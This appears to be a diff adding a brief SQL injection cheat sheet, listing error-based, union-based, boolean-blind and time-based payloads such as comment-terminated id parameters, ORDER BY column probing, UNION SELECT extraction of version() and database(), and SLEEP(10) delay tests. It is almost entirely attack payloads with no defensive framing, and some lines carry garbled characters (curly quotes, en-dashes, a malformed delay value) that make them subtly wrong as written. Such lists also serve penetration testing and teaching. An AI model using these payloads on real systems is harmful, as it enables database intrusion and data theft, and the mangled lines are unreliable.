@@ -1,0 +1,20 @@
+. Error-Based SQL Injections:
+id=1′ –+
+–+ will comment out all that comes after it. So, our backend query would be select * from table_name where id='1' --+'
+
+Union-Based SQL Injections:
+?id=1' order by 1 --+      no error
+?id=1' order by 2 --+      no error
+?id=1' order by 3 --+      no error
+?id=1' order by 4 --+      we get error
+id=1‘ UNION SELECT 1,2,3 --+
+?id=-1‘ UNION SELECT 1,version(),database() --+
+
+Blind Boolean-based SQL Injections:
+?id=1' AND 1=1 --+
+?id=1' AND (length(database())) = 1 --+
+
+ Blind Time-Based SQL Injections:
+And SLEEP(10) if sleep then Vulnerable
+OR SLEEP(10) if sleep then vulnerable
+Time delay 00:00:005
